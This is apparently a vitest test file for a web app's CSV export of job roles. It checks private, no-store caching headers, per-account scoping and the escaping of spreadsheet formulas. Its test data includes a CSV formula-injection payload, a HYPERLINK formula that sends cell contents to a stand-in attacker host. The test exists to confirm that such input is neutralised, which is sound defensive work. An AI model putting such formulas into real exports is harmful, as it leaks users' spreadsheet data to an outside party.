/**
 * The export is one account's whole roles table as a download. It must never be kept by a cache on
 * the way, and scraped text in it must reach the spreadsheet as text, never as a formula.
 */
import { expect, it, vi } from "vitest";
import { NextRequest } from "next/server";

const USER_ID = "0f3b2c4e-1d2a-4b6c-8e9f-0a1b2c3d4e5f";
vi.mock("@/lib/route-auth", () => ({ routeUser: async () => ({ ok: true, user: { id: USER_ID } }) }));
const fetchRoleRows = vi.hoisted(() => vi.fn());
vi.mock("@/lib/queries/jobs", () => ({
  fetchRoleRows,
  parseRolesFilters: () => ({}),
  scoreStateText: () => "",
}));

import { GET } from "./route";

const firstSeenAt = new Date("2026-09-01T00:00:00Z");
const row = (title: string, location: string) => ({
  company: { name: "Acme Robotics", homepageUrl: "https://acme.example/" },
  job: { title, location, url: "https://job-boards.greenhouse.io/acme/jobs/1", status: "open", fitScore: 80, firstSeenAt, postedAt: null, closedAt: null, inTable: true, archivedAt: null },
  decision: null,
  stage: "matched",
});

it("is private and never cached, and writes scraped formulas as text", async () => {
  fetchRoleRows.mockResolvedValueOnce([row('=HYPERLINK("https://evil.example/?"&A2,"Apply")', "@London")]).mockResolvedValue([]);
  const response = await GET(new NextRequest("https://ava.test/api/export.csv"));
  expect(response.status).toBe(200);
  expect(response.headers.get("cache-control")).toBe("private, no-store");
  expect(response.headers.get("x-content-type-options")).toBe("nosniff");
  const [header, line] = (await response.text()).split("\r\n");
  expect(header!.startsWith("company,website,role,location,url")).toBe(true);
  expect(line).toContain(`"'=HYPERLINK(""https://evil.example/?""&A2,""Apply"")",'@London,`);
  // Every read was scoped to the signed-in account.
  expect(fetchRoleRows.mock.calls.every(([userId]) => userId === USER_ID)).toBe(true);
});
